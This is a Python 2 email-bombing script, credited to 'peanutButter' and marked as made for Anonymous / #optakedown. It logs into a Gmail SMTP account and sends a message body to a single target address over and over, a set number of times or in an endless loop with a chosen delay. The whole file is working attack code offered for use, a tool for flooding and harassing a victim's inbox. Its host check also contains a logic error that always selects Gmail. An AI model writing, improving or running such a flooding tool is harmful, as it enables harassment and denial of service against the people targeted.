#!/usr/bin/python
# -*- coding: UTF-8 -*

# Made by peanutButter
# Made for Anonymous / #optakedown

import sys
import smtplib
import getpass
import time

from sys import argv
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText

sprinklyline = "~~*~~*~~*~~*~~*~~*~~*~~*~~*~~*~~*~~*~~*~~*~~*~~" # Cus why not

if len(sys.argv) != 2:
	print sprinklyline
	print 'Forgot to select target email? Example of usage:'
	print '"python emailspam.py example@gmail.com"'
	print sprinklyline
else:
	script, targetemail = argv

	bodytext = open('bodytext.txt', 'r') # Open bodytext.txt
	bodycontent = bodytext.read()

	print sprinklyline
	host = raw_input("Enter your email host (Gmail, Yahoo, etc): ")
	if host == 'gmail' or 'Gmail' or 'GMAIL' or 'gMAIL':
		server = smtplib.SMTP('smtp.gmail.com', 587) # Set GMAIL smtp server settings
		server.starttls() # Start TLS
	else:
		print 'Work in progress for other email hosts'
		quit()

	print sprinklyline
	emailusername = raw_input("Enter your Email username: ") # Email input
	emailpassword = getpass.getpass("Enter your Email password: ") # Password input
	emailsubject = raw_input("Enter email subject: ") # Subject input
	print sprinklyline

	server.login(emailusername, emailpassword) # Login to the smtp server
	
	repeat = raw_input("Enter the amount of times you want to send this email (0 = Infinite): ")
	delay = raw_input("Enter the amount of time to wait between each email (In seconds): ")

	print "Sending a test email to your email account.."
	# Sending a test email to check that everything works fine.
	fromaddr = emailusername + '@gmail.com'
	toaddr = emailusername + '@gmail.com'
	msg = MIMEMultipart()
	msg['From'] = fromaddr #From
	msg['To'] = toaddr #To
	msg['Subject'] = "Test Email successfuly sent! " + emailsubject #Subject
	body = bodycontent #Body
	msg.attach(MIMEText(body,'plain')) #Attach body to email
	text = msg.as_string() #Output msg as a string
	time.sleep(3)
	print "Test email succesfuly recieved!"
	print "Let the email spam begin!"
	print sprinklyline

	server.sendmail(fromaddr, toaddr, text)	

	if repeat == '0':
		count = 1
		while True:
			time.sleep(int(delay))
			fromaddr = emailusername + '@gmail.com'
			toaddr = targetemail
			msg = MIMEMultipart()
			msg['From'] = fromaddr #From
			msg['To'] = toaddr #To
			msg['Subject'] = "[#" + str(count) + "] " + emailsubject #Subject
			body = bodycontent #Body
			msg.attach(MIMEText(body,'plain')) #Attach body to email
			text = msg.as_string() #Output msg as a string

			server.sendmail(fromaddr, toaddr, text) #Send the email

			print ("Email #" + str(count) + "Sent successfuly!")
			count += 1
	else:
		count = 1
		while (count <= int(repeat)):
			time.sleep(int(delay))
			fromaddr = emailusername + '@gmail.com'
			toaddr = targetemail
			msg = MIMEMultipart()
			msg['From'] = fromaddr #From
			msg['To'] = toaddr #To
			msg['Subject'] = "[#" + str(count) + "] " + emailsubject #Subject
			body = bodycontent #Body
			msg.attach(MIMEText(body,'plain')) #Attach body to email
			text = msg.as_string() #Output msg as a string

			server.sendmail(fromaddr, toaddr, text) #Send the email

			print ("Email #" + str(count) + " Sent successfuly!")
			count += 1
	
